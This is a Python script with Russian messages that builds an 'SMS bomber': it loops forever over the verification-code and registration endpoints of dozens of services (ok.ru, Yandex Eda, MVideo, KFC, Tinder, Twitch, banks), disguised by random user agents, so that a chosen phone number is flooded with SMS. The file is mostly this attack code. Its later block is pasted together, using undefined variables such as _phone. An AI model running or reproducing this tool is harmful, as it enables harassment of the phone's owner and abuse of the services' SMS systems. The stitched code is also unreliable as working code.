# import requests
# from requests.api import head 
# from fake_useragent import UserAgent
# import time 

# class SMSBomber:
#     def __init__(self, number):
#         self.number = number
#         self.service = {
#             'https://ok.ru/dk?st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone': {'data': {'phone': number}},
#             "https://youla.ru/web-api/auth/request_code": {'data': {'phone': number}},
#             "https://cloud.mail.ru/api/v2/notify/applink": {'data': {'phone': number, 'api': 2, 'email':'email', 'x-email': 'x-email'}},
#             "https://delivio.by/be/api/register": {'json': {'phone': number}},
#             "https://eda.yandex/api/v1/user/request_authentication_code": {'json' : {'phone_number' : number}},
#             "https://www.slivki.by/login/send-code": {'get': number}
            
#         }
#         self.delay = 10

#     def attack(self):
#         user_agent = UserAgent().random
#         headers = {'user_agent': user_agent}
#         iteration = 0

#         while True:
#             for key, value in self.service.items():
#                 for _type, meta in value.items():
#                     try:
#                         if _type == 'data':
#                             request = requests.post(key, headers=headers, data=meta)
#                         elif _type == 'json':
#                             request = requests.get(key, headers=headers, json=meta)
#                         elif _type == 'get':
#                             request = requests.get(key+self.number, headers=headers)
#                         print(f'[send:] {key.split("/")[2].title()} completed!')
#                     except:
#                         print(f'[send:] {key.split("/")[0].title()} failed!')
#             iteration +=1 
#             print(f'{iteration}, round complete')
#             time.sleep(self.delay)
# if __name__ == '__main__':
#     number = input('Send number: ')
#     sms = SMSBomber(number)
#     sms.attack()
import requests
from requests.api import head 
from fake_useragent import UserAgent
import time 

class SMSBomber:
    def __init__(self, number):
        self.number = number
        self.service = {
            'https://ok.ru/dk?st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone': {'data': {'phone': number}},
            "https://youla.ru/web-api/auth/request_code": {'data': {'phone': number}},
            "https://cloud.mail.ru/api/v2/notify/applink": {'data': {'phone': number, 'api': 2, 'email':'email', 'x-email': 'x-email'}},
            "https://delivio.by/be/api/register": {'json': {'phone': number}},
            "https://eda.yandex/api/v1/user/request_authentication_code": {'json' : {'phone_number' : number}},
            "https://www.slivki.by/login/send-code": {'get': number}
            
        }
        self.delay = 10

    def attack(self):
        user_agent = UserAgent().random
        headers = {'user_agent': user_agent}
        iteration = 0

        while True:
            for key, value in self.service.items():
                for _type, meta in value.items():
                    try:
                        if _type == 'data':
                            request = requests.post(key, headers=headers, data=meta)
                        elif _type == 'json':
                            request = requests.get(key, headers=headers, json=meta)
                        elif _type == 'get':
                            request = requests.get(key+self.number, headers=headers)
                        print(f'[send:] {key.split("/")[2].title()} completed!')
                    except:
                        print(f'[send:] {key.split("/")[0].title()} failed!')
            iteration +=1 
            print(f'{iteration}, round complete')
            time.sleep(self.delay)
if __name__ == '__main__':
    number = input('Send number: ')
    sms = SMSBomber(number)
    sms.attack()
 
try: 
  requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en') 
  print('[+] oyorooms отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'}) 
  print('[+] MVideo отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'}) 
  print('[+] newnext отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone}) 
  print('[+] Sunlight отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'}) 
  print('[+] alpari отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'}) 
  print('[+] Sberbank отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}) 
  print('[+] Psbank отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone}) 
  print('[+] KFC отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}) 
  print('[+] carsmile отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/') 
  print('[+] Citilink отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3}) 
  print('[+] Delitime отправлено!') 
except: 
  print('[-] Не отправлено!') 
try: 
  requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}) 
  print('[+] Guru отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}) 
  print('[+] ICQ отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"}) 
  print('[+] InDriver отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone}) 
  print('[+] Pmsm отправлено!') 
except: 
  print('[-] Не отправлено!')


try: 
  requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}) 
  print('[+] IVI отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone}) 
  print('[+] Lenta отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"}) 
  print('[+] Mail.ru отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""}) 
  print('[+] MVideo отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone}) 
  print('[+] OK отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://plink.tech/register/',json={"phone": _phone}) 
  print('[+] Plink отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone}) 
  print('[+] SMSgorod отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone}) 
  print('[+] Tinder отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}) 
  print('[+] Twitch отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'}) 
  print('[+] CabWiFi отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2}) 
  print('[+] wowworks отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone}) 
  print('[+] Eda.Yandex отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}) 
  print('[+] Youla отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"}) 
  print('[+] Alpari отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
try: 
  requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone}) 
  print('[+] SMS отправлено!') 
except: 
  print('[-] не отправлено!') 
 
try: 
  requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone}) 
  print('[+] Delivery отправлено!') 
except: 
  print('[-] Не отправлено!') 
 
# try: 
#     iteration += 1           
#     print("""                         
#                          Круг пройден. Нажмите Ctrl+Z для остановки     
#                                                 """) 
# except: 
# break